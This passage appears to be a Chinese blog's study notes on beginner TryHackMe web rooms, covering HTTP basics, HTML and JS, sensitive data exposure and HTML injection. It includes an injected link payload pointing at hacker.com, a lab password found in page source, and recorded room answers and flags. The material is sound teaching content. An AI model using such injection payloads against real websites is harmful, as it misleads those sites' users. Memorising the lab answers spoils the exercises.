    <url>/2024/01/27/THM-HTTP%20in%20detail(HTTP%E5%8D%8F%E8%AE%AE%E4%BB%8B%E7%BB%8D)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/httpindetail" >https://tryhackme.com/room/httpindetail <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>通过学习相关知识点：了解如何使用 HTTP 协议向 Web 服务器请求内容。</p>
<h2 id="什么是-HTTP-S"><a href="#什么是-HTTP-S" class="headerlink" title="什么是 HTTP(S)?"></a>什么是 HTTP(S)?</h2><p><strong>什么是 HTTP？ （HyperText Transfer Protocol-超文本传输协议）</strong></p>
<p>HTTP 是你浏览网站时使用的，由 Tim Berners-Lee 和他的团队在 1989-1991 年间开发。 HTTP 是用于与web服务器进行通信以便传输网页数据的一组规则，这些网页数据包括 HTML、图像、视频等。</p>
<p><strong>什么是 HTTPS？ （HyperText Transfer Protocol Secure）</strong></p>
<p>HTTPS 是 HTTP 的安全版本。 HTTPS 数据经过了加密处理，因此它不仅可以阻止第三方看到你正在接收和发送的数据内容，而且还可以确保你正在与正确的 Web 服务器进行通信（而不是其他冒充你所访问的目标web服务器的东西）。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118214001544.png"
                      alt="image-20221118214001544"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221118215932057.png"
                      alt="image-20221118215932057"
                ></p>
<h2 id="请求和响应"><a href="#请求和响应" class="headerlink" title="请求和响应"></a>请求和响应</h2><p>当我们访问一个网站时，你的浏览器将需要向一个web服务器发出请求，以获得诸如 HTML、图像等资源，并根据来自web服务器的响应得到下载权限。在此之前，你需要明确地告诉浏览器如何获取以及在哪里访问具体的资源文件，这里就需要 URL 来提供一些帮助。</p>
<p><strong>什么是 URL? (Uniform Resource Locator)</strong></p>
<p>如果你使用过互联网，那么你就使用过 URL，URL 主要用于指示如何访问互联网上的资源。下面的图片显示了一个 URL 的所有特性(它可能不会在每个请求中使用所有特性)。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221119090841555.png"
                      alt="image-20221119090841555"
                ></p>
<ul>
<li>Scheme：这说明了使用什么协议来访问资源，如HTTP、HTTPS、FTP(文件传输协议)。</li>
<li>User：有些服务需要认证以完成登录，你可以在URL中输入用户名和密码进行登录。</li>
<li>Host&#x2F;Domain：你希望访问的服务器的域名或IP地址。</li>
<li>Port：你将要连接到的端口，通常HTTP协议将使用 80 端口，HTTPS协议将使用 443 端口，但是这些协议也可以选择使用 1 - 65535 之间的任何端口号。</li>
<li>Path：你试图访问的资源的文件名或位置。</li>
<li>Query String：可以发送到请求路径的额外信息位。例如，&#x2F;blog?id &#x3D;1 将告诉blog path你希望接收id为1的博客文章。</li>
<li>Fragment：这是对所请求的实际页面上的位置的引用。这通常用于具有较长内容的页面，并且可以将页面的某一部分直接链接到该引用；因此，只要用户通过该URL访问页面，就可以看到链接所对应的部分内容。</li>
</ul>
<p><strong>发出请求</strong></p>
<p>只需要一行”GET &#x2F; HTTP&#x2F;1.1”就可以向web服务器发出请求。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221119092848618.png"
                      alt="image-20221119092848618"
                ></p>
<p>但为了获得更丰富的网络体验，你还需要通过请求消息发送其他数据，这些数据将通过请求报头进行发送，在请求报头中也会包含一些额外的信息，以提供给与你进行通信的web服务器。</p>
<p><strong>请求示例（由浏览器客户端发送至服务器端）</strong></p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: tryhackme.com</span><br><span class="line">User-Agent: Mozilla/5.0 Firefox/87.0</span><br><span class="line">Referer: https://tryhackme.com/</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>分解以上请求示例的每一行:</p>
<ul>
<li>第1行：这个请求将发送GET方法(详见本文的HTTP方法小节)，用<code>/</code>请求主页，并告诉web服务器我们正在使用的HTTP协议版本为<code>1.1</code>。</li>
<li>第2行：我们将告诉web服务器我们想要访问域名为<code>tryhackme.com</code>的网站。</li>
<li>第3行：我们将告诉web服务器我们正在使用Firefox 87版本浏览器。</li>
<li>第4行：我们正在告诉web服务器，将我们指向当前页面的来源网址（引用页）是<code>https://tryhackme.com</code></li>
<li>第5行：HTTP请求总是以空行结束，以通知web服务器该HTTP请求已经完成。</li>
</ul>
<p><strong>响应示例（由服务器端发送至浏览器客户端）</strong></p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.15.8</span><br><span class="line">Date: Fri, 09 Apr 2021 13:34:03 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 98</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>TryHackMe<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    Welcome To TryHackMe.com</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>分解以上响应示例的每一行:</p>
<ul>
<li><p>第1行：HTTP 1.1是服务器正在使用的HTTP协议版本，然后是HTTP状态码(在本例中为“200 Ok”)，它告诉我们该响应对应的请求已经成功完成。</p>
</li>
<li><p>第2行：这告诉我们web服务器使用的软件和其版本号。</p>
</li>
<li><p>第3行：web服务器的当前日期、时间和时区。</p>
</li>
<li><p>第4行：Content-Type报头会告诉客户端该web服务器将要发送什么类型的信息，比如HTML、图像、视频、pdf、XML。</p>
</li>
<li><p>第5行：Content-Length将告诉客户端该响应的长度，这样我们就可以确认没有发生数据丢失。</p>
</li>
<li><p>第6行：HTTP响应包含一个空行，用于确认HTTP响应的结束。</p>
</li>
<li><p>第7-14行：被请求的信息，在本例中是关于目标主页的html代码。</p>
</li>
</ul>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221119100339290.png"
                      alt="image-20221119100339290"
                ></p>
<h2 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h2><p>HTTP 方法是客户端在发出 HTTP 请求时显示其预期操作的一种方式。有很多 HTTP 方法，在此我们将介绍最常见的方法，在大多数情况下你将处理的是 GET 和 POST 方法。</p>
<p>GET 请求：用于从 Web 服务器中获取信息。</p>
<p>POST 请求：用于向 Web 服务器提交数据并可能创建新记录。</p>
<p>PUT 请求：用于向 Web 服务器提交数据以更新信息。</p>
<p>DELETE 请求：用于从Web服务器中删除信息&#x2F;记录。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221119101025366.png"
                      alt="image-20221119101025366"
                ></p>
<h2 id="HTTP状态代码"><a href="#HTTP状态代码" class="headerlink" title="HTTP状态代码"></a>HTTP状态代码</h2><p><strong>HTTP状态码</strong></p>
<p>在前面的叙述中，你能了解到当 HTTP 服务器发出响应时，第一行总是会包含一个状态代码，该状态码用于通知客户端所发出请求对应的结果以及针对请求的可能处理方式。 这些状态码可以分为 5 个不同的范围：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221119110901244.png"
                      alt="image-20221119110901244"
                ></p>
<p><strong>常见的HTTP状态码</strong></p>
<p>有很多不同的 HTTP 状态码，这还不包括应用程序自己定义的状态码，我们将介绍一些你可能遇到的最常见的 HTTP 响应状态码：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221119111632793.png"
                      alt="image-20221119111632793"
                ></p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221119111654255.png"
                      alt="image-20221119111654255"
                ></p>
<h2 id="请求标头和响应标头"><a href="#请求标头和响应标头" class="headerlink" title="请求标头和响应标头"></a>请求标头和响应标头</h2><p>标头是你在发出请求时可以发送到 Web 服务器的额外数据位。</p>
<p>虽然在发出 HTTP 请求时没有严格要求标头，但在缺少标头的情况下，你会发现你很难正确地查看网站。</p>
<p><strong>常见的请求头</strong></p>
<p>以下是从客户端（通常是你的浏览器）发送到服务器端的标头信息。</p>
<p>Host：一些 Web 服务器可能会在多个网站上托管内容，因此通过提供主机标头，你可以告诉web服务器你需要访问哪个网站，否则你只会收到web服务器对应的默认网站的响应。</p>
<p>User-Agent：这是你所使用的浏览器软件类型和版本号，告诉web服务器你的浏览器软件类型能帮助它为你的浏览器正确格式化网站，而且网站相关的 HTML、JavaScript 和 CSS 的一些元素只在某些浏览器中可用。</p>
<p>Content-Length：当向 Web 服务器发送数据时，例如当浏览器通过表单向web服务器发送数据时，Content-Length将告诉 Web 服务器该 Web 请求所期望的数据长度，这样web服务器就可以确保它在响应浏览器请求时并不会丢失任何数据。</p>
<p>Accept-Encoding：这将告诉web服务器 当前使用的浏览器支持什么类型的压缩方法，这样数据就可以变小以便通过互联网进行传输。</p>
<p>Cookie：Cookie 是发送到服务器以帮助记住你的信息的数据。</p>
<p><strong>常见的响应头</strong></p>
<p>以下是发出请求后从服务器端返回给浏览器客户端的标头信息。</p>
<p>Set-Cookie：表示浏览器端要存储的Cookie信息，之后每次浏览器发出请求时，Cookie值都会发送回 Web 服务器。</p>
<p>Cache-Control：在再次请求之前，响应内容在浏览器缓存中将存储多长时间。</p>
<p>Content-Type：这将告诉客户端 从web服务器端所返回的数据类型，即 HTML、CSS、JavaScript、图像、PDF、视频等。使用Content-Type标头，浏览器才能知道如何处理数据。</p>
<p>Content-Encoding：在通过 Internet 发送数据时，web服务器将使用什么方法压缩数据以使其更小。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221119173812275.png"
                      alt="image-20221119173812275"
                ></p>
<h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><p>Cookie是存储在你的计算机上的一小段数据。 当你从web服务器收到“Set-Cookie”标头时，对应的Cookie信息将被浏览器保存，然后，你发出的每一个进一步请求，都会将 Cookie 数据发送回web服务器。 由于 HTTP 是无状态的（不跟踪你之前的请求），所以 Cookie 可用于提醒web服务器你的身份、网站的一些个人设置或者你以前是否访问过该网站。 </p>
<p>让我们看一下下面这个 HTTP 请求示例：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221119181012864.png"
                      alt="image-20221119181012864"
                ></p>
<p>Cookie 可用于多种用途，但最常用于网站身份验证。 cookie 值通常不会是一个可以让你直接看到密码的明文字符串，而会是一个令牌-token（具有不容易被猜到的唯一密码）。</p>
<p><strong>查看你的 Cookie</strong></p>
<p>你可以使用浏览器中的开发者工具查看你的浏览器向网站发送了哪些 cookie。 </p>
<p>打开开发人员工具后，单击“网络”选项卡。 此选项卡将向你显示你的浏览器已请求的所有资源的列表，你可以单击每一个子项以查看请求和响应的详细分类信息。 如果你的浏览器发送了 cookie，你将在请求消息的“Cookie”选项卡上看到具体的cookie内容。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221119223656762.png"
                      alt="image-20221119223656762"
                ></p>
<h2 id="发送请求-练习"><a href="#发送请求-练习" class="headerlink" title="发送请求-练习"></a>发送请求-练习</h2><p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221119231104215.png"
                      alt="image-20221119231104215"
                ></p>
<p>问题一：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221119231159570.png"
                      alt="image-20221119231159570"
                ></p>
<p>问题二：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221119231302404.png"
                      alt="image-20221119231302404"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../articleimg/image-20221119231321822.png"
                      alt="image-20221119231321822"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221119231429010.png"
                      alt="image-20221119231429010"
                ></p>
<p>问题三：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221119231552049.png"
                      alt="image-20221119231552049"
                ></p>
<p>问题四：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221119231713945.png"
                      alt="image-20221119231713945"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221119231851305.png"
                      alt="image-20221119231851305"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221119231940989.png"
                      alt="image-20221119231940989"
                ></p>
<p>问题五：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221119232113263.png"
                      alt="image-20221119232113263"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221119232238841.png"
                      alt="image-20221119232238841"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221119232319559.png"
                      alt="image-20221119232319559"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221119230941300.png"
                      alt="image-20221119230941300"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-How websites work(网站运行基础)-学习</title>
    <url>/2024/01/27/THM-How%20websites%20work(%E7%BD%91%E7%AB%99%E8%BF%90%E8%A1%8C%E5%9F%BA%E7%A1%80)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/howwebsiteswork" >https://tryhackme.com/room/howwebsiteswork <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：要对网站进行漏洞利用，你首先需要知道网站是如何被创建的，本文将涉及HTML&amp;JS以及一些Web安全基础问题。</p>
<h2 id="网站是如何运行的？"><a href="#网站是如何运行的？" class="headerlink" title="网站是如何运行的？"></a>网站是如何运行的？</h2><p>本文将介绍如何创建网站，并介绍关于网站的一些基本的安全问题。</p>
<p>当你访问一个网站时，你的浏览器(如Safari或谷歌Chrome)会向web服务器发出请求，这将询问有关你正在访问的页面的信息，然后web服务器将以“用来显示页面的数据”响应你的浏览器；web服务器是一些位置在世界上其他地方的 并且 能够处理你的请求的专用计算机。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230328120422537.png"
                      alt="image-20230328120422537"
                ></p>
<p>一个网站有两个主要组成部分：</p>
<ol>
<li>前端(客户端)-你的浏览器呈现(渲染)网站的方式。</li>
<li>后端(服务器端)-处理你的请求消息并返回响应消息的服务器。</li>
</ol>
<p>在你的浏览器向web服务器发出请求的过程中 还涉及许多其他过程，但现在，我们只需要了解：我们能够向web服务器发出请求，web服务器将响应我们的浏览器以提供一些用于向我们呈现信息的数据。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230328121129257.png"
                      alt="image-20230328121129257"
                ></p>
<h2 id="用于网站运行的HTML"><a href="#用于网站运行的HTML" class="headerlink" title="用于网站运行的HTML"></a>用于网站运行的HTML</h2><p>网站的网页内容主要使用以下内容创建：</p>
<ul>
<li>HTML：用于构建网站并定义其结构；</li>
<li>CSS：通过添加样式选项使网站看起来更漂亮；</li>
<li>JavaScript： 使用交互性脚本在网站页面上实现复杂的功能。</li>
</ul>
<p>超文本标记语言(HTML-HyperText Markup Language)是专门用于编写网站的网页内容的语言，元素-Elements (也被称为标签-Tags)是HTML页面的构建模块，它能告诉浏览器如何显示网页内容。下面的代码片段显示了一个简单的HTML文档，HTML的结构对于每个网站来说都是一样的：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230328232057953.png"
                      alt="image-20230328232057953"
                ></p>
<p>示例中的HTML结构(如上图所示)包含了以下组件:</p>
<ul>
<li><code>&lt;!DOCTYPE html&gt;</code>定义了此页面是HTML5文档，这有助于在不同浏览器之间实现标准化，并告诉浏览器使用HTML5来解释页面。</li>
<li><code>&lt;html&gt;</code>元素是是HTML页面的根元素——所有其他元素都在这个元素之后。</li>
<li><code>&lt;head&gt;</code>元素包含了关于页面的信息(例如页面标题)。</li>
<li><code>&lt;body&gt;</code>元素定义了HTML文档的正文，浏览器中只显示body(主体)内部的内容。</li>
<li><code>&lt;h1&gt;</code>元素定义了一个大标题（heading）。</li>
<li><code>&lt;p&gt;</code>元素定义了一个段落（paragraph）。</li>
</ul>
<p>还有许多可用于不同目的的其他HTML元素(标签)，例如，按钮(<code>&lt;button&gt;</code>)、图像(<code>&lt;img&gt;</code>)、列表等标签。</p>
<p>元素(标签)可以包含一些属性，比如class属性可以用来设置一个元素的样式(例如设置段落标签的颜色)–<code>&lt;p class=&quot;bold-text&quot;&gt;</code>，还有src属性可用于在图像标签中指定图像的位置–<code>&lt;img src=&quot;img/cat.jpg&quot;&gt;</code>。</p>
<p>一个元素(标签)可以有多个属性，并且每个属性都有自己独特的用途，例如<code>&lt;p attribute1=&quot;value1&quot; attribute2=&quot;value2&quot;&gt;</code></p>
<p>元素可以有id属性(例如<code>&lt;p id=&quot;example&quot;&gt;</code>)，id在元素的属性中具有唯一性。id属性不同于class属性(多个元素可以使用同一个class属性)，不同的元素会有不同的id来唯一地标识它们，元素的id属性主要用于样式化以及提供给JavaScript脚本识别。</p>
<p>你可以通过右键单击网页并选择“查看页面源代码”(Chrome)选项 或者选择“显示页面源代码”(Safari)选项，以此来查看任何网站网页的HTML页面。</p>
<p>tips：本小节只是简单介绍一下用于网站运行的HTML，关于HTML的更多教程请参考—— <a class="link"   href="https://www.runoob.com/html/html-tutorial.html" >https://www.runoob.com/html/html-tutorial.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<p><strong>答题</strong></p>
<p>使用和本文相关的TryHackMe实验房间中的模拟界面 并回答问题。</p>
<p>补充图像文件的扩展名：<code>&lt;img src=&#39;img/cat-2.jpg&#39;&gt;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230328235728518.png"
                      alt="image-20230328235728518"
                ></p>
<p>修复图像显示后，在网页中会显示一张带有字符内容的图像：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230328235902146.png"
                      alt="image-20230328235902146"
                ></p>
<blockquote>
<p>修复显示的图像内容中的字符为：HTMLHERO</p>
</blockquote>
<p>在网页中添加一张新图片：<code>&lt;img src=&#39;img/dog-1.png&#39;&gt;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230329000308629.png"
                      alt="image-20230329000308629"
                ></p>
<blockquote>
<p>新添加的图像中的字符内容为：DOGHTML</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230328235613254.png"
                      alt="image-20230328235613254"
                ></p>
<h2 id="用于网站运行的JS"><a href="#用于网站运行的JS" class="headerlink" title="用于网站运行的JS"></a>用于网站运行的JS</h2><p>JavaScript (JS)是世界上最流行的编码语言之一，它允许网站的页面变得具有交互性。HTML用于创建网站的结构和内容，而JavaScript用于控制网页的功能——没有JavaScript，页面就不会有交互元素，将永远是静态的；在网站页面上发生特定事件时，JS可以对应地实时动态更新网站页面，比如我们可以使用JS来设置——每当用户单击按钮，则动态改变按钮的样式或者动态显示移动动画等等。</p>
<p>JavaScript可以被添加到网站的页面源代码中，JS代码可以通过以下两种方式进行加载：</p>
<ul>
<li>可以通过<code>&lt;script&gt;&lt;/script&gt;</code>标签直接进行加载，将具体的JS代码包含在<code>script</code>标签之间即可；</li>
<li>通过src属性远程包含js脚本文件：<code>&lt;script src=&quot;/location/of/javascript_file.js&quot;&gt;&lt;/script&gt;</code>。</li>
</ul>
<p>下面的JavaScript代码能够在网站的页面上找到id为“demo”的HTML元素，并能将元素内容更改为“Hack The Planet”：</p>
<p><code>document.getElementById(&quot;demo&quot;).innerHTML = &quot;Hack the Planet&quot;;</code></p>
<p>通过HTML元素也可以设置事件，如“onclick”或“onhover”，当事件发生时则会自动执行和事件对应的JS代码；例如，下面的代码能够将带有“demo”ID的元素的文本内容更改为“Button Clicked”:</p>
<p><code>&lt;button onclick=&#39;document.getElementById(&quot;demo&quot;).innerHTML = &quot;Button Clicked&quot;;&#39;&gt;Click Me!&lt;/button&gt;</code></p>
<p>在实际情况中，“onclick”事件一般会在JavaScript脚本标签中定义，而不是直接通过HTML元素定义。</p>
<p>tips：本小节只是简单介绍一下用于网站运行的JS，关于JavaScript的更多教程请参考——  <a class="link"   href="https://www.runoob.com/js/js-tutorial.html" >https://www.runoob.com/js/js-tutorial.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<p><strong>答题</strong></p>
<p>使用和本文相关的TryHackMe实验房间中的模拟界面 并回答问题。</p>
<p>将以下内容添加到模拟编辑器界面的第 9 行，然后单击“渲染 HTML+JS 代码”按钮：</p>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;demo&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;Hack the Planet&quot;</span>;</span><br></pre></td></tr></table></figure></div>

<p>添加代码前：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230329003439859.png"
                      alt="image-20230329003439859"
                ></p>
<p>添加代码并渲染后：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230329003413451.png"
                      alt="image-20230329003413451"
                ></p>
<p>将以下内容放在 HTML 编辑器中（第 7 行和第 8 行之间）：</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&#x27;document.getElementById(&quot;demo&quot;).innerHTML = &quot;Hack the Planet&quot;;&#x27;</span>&gt;</span>Click Me!<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230329173108490.png"
                      alt="image-20230329173108490"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230329173148889.png"
                      alt="image-20230329173148889"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230329003029466.png"
                      alt="image-20230329003029466"
                ></p>
<h2 id="敏感数据泄露介绍"><a href="#敏感数据泄露介绍" class="headerlink" title="敏感数据泄露介绍"></a>敏感数据泄露介绍</h2><p>敏感数据泄露是指网站没有正确保护(或删除)用户的敏感明文信息（通常是在站点的前端源代码中找到一些敏感数据）。</p>
<p>我们知道，网站是用许多HTML元素(标签)构建的，所有这些元素我们都可以通过浏览器中的“viewing the page source”选项来查看，而网站开发人员可能会忘记删除登录凭据、网站隐私部分的隐藏链接或其他以HTML&#x2F;JavaScript形式显示的敏感数据——也就是说，我们可以尝试通过浏览器的“viewing the page source”选项来发现一些敏感数据。</p>
<p>敏感信息可能会被潜在地利用，从而进一步扩大攻击者对web应用程序不同部分的访问权限；例如，网站的页面源代码中可能存在带有临时登录凭据的HTML注释，当你查看页面的源代码时就可能发现这一点，这使得你可以使用所发现的凭据在应用程序的其他地方实现登录(或者更糟，将凭据用于访问站点的其他后端组件)。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230329174411351.png"
                      alt="image-20230329174411351"
                ></p>
<p>无论何时评估web应用程序的安全性问题，首先应该做的事情之一就是检查网站的页面源代码，看看是否可以找到任何暴露的登录凭据或隐藏的链接。</p>
<p><strong>答题</strong></p>
<p>使用和本文相关的TryHackMe实验房间中的模拟界面 并回答问题。</p>
<p>通过查看页面源代码发现以及泄露的敏感信息（右键单击以下页面并选择查看框架的源代码）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230329174717883.png"
                      alt="image-20230329174717883"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230329175056256.png"
                      alt="image-20230329175056256"
                ></p>
<blockquote>
<p>隐藏在源代码中的密码是：testpasswd 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230329175143632.png"
                      alt="image-20230329175143632"
                ></p>
<h2 id="HTML注入介绍"><a href="#HTML注入介绍" class="headerlink" title="HTML注入介绍"></a>HTML注入介绍</h2><p>HTML注入是一种漏洞(发生在客户端侧)，这会将未经过滤的用户输入直接显示在网站页面上。如果一个网站未能过滤用户输入(过滤用户输入到网站的任何“恶意”文本)，并且该输入能被显示在网站页面上，那么攻击者就可以针对易受攻击的网站实现HTML代码注入操作。</p>
<p>输入消毒(即过滤恶意输入)对于保持网站安全性非常重要，因为用户输入到网站的信息通常会用于其他前端或者后端的功能实现；比如，有一类漏洞是数据库注入漏洞，如果存在这种漏洞——你就可以通过控制SQL查询的输入来操作数据库并查找其中的数据，从而实现以另一个用户的身份登录网站。</p>
<p>当用户可以控制如何显示他们的输入内容时，用户就可以向网站提交HTML(或JavaScript)代码，而浏览器就可能在网站页面中使用这些代码，从而允许用户能够控制网站页面的外观和功能。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230329181051842.png"
                      alt="image-20230329181051842"
                ></p>
<p>上图显示了表单如何将文本输出到网站页面：无论用户在“What’s your name”的输入框中输入什么，用户所输入的内容都将传递给网站的JavaScript函数，然后输出结果将被显示在网站页面上；这意味着用户能够在输入框中添加自己构造的HTML或JavaScript代码，而这些代码将生效并能附加相关结果以显示在网站页面上。</p>
<p>一般的安全规则是“永远不要相信用户输入”。为了防止用户的恶意输入影响网站的正常功能，网站开发人员应该在使用JavaScript函数之前对用户所输入的所有内容进行消毒（即过滤），在这种情况下，网站开发人员应该删除“用户输入内容”中的HTML标签。</p>
<p><strong>答题</strong></p>
<p>使用和本文相关的TryHackMe实验房间中的模拟界面 并回答问题。</p>
<p>利用模拟页面注入HTML，让页面显示一个恶意链接：<code>&lt;a href=&quot;http://hacker.com&quot;&gt;hacker link&lt;/a&gt;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230329183033723.png"
                      alt="image-20230329183033723"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230329183134511.png"
                      alt="image-20230329183134511"
                ></p>
<blockquote>
<p>得到的answer为：HTML_INJ3CTI0N 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230329183220725.png"
                      alt="image-20230329183220725"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Putting it all together(网站组件协同工作介绍)-学习</title>
    <url>/2024/01/27/THM-Putting%20it%20all%20together(%E7%BD%91%E7%AB%99%E7%BB%84%E4%BB%B6%E5%8D%8F%E5%90%8C%E5%B7%A5%E4%BD%9C%E4%BB%8B%E7%BB%8D)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/puttingitalltogether" >https://tryhackme.com/room/puttingitalltogether <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：了解Web服务的所有单独组件如何协同工作，这种协同工作能让我们可以访问自己喜欢的网站。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>当我们在浏览器中请求网页信息时，幕后还发生了很多事情。在请求一个网站时，我们的计算机需要知道它需要与之通信的Web服务器的 IP 地址，为此，本地计算机需要使用DNS，然后，我们的计算机将使用一组被称为 HTTP 协议的特殊命令与 Web 服务器进行通信， Web 服务器随后将返回 HTML 、JavaScript 、CSS、图像文件等资源，最后，我们本地计算机的浏览器将使用这些资源 并通过正确格式化来向我们呈现网站的相关网页内容。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230328122449214.png"
                      alt="image-20230328122449214"
                ></p>
<p>此外，还有一些其他组件可以帮助web服务更有效地运行，并提供额外的功能。</p>
<h2 id="Web服务的其他组件"><a href="#Web服务的其他组件" class="headerlink" title="Web服务的其他组件"></a>Web服务的其他组件</h2><p><strong>负载均衡器（Load Balancers）</strong></p>
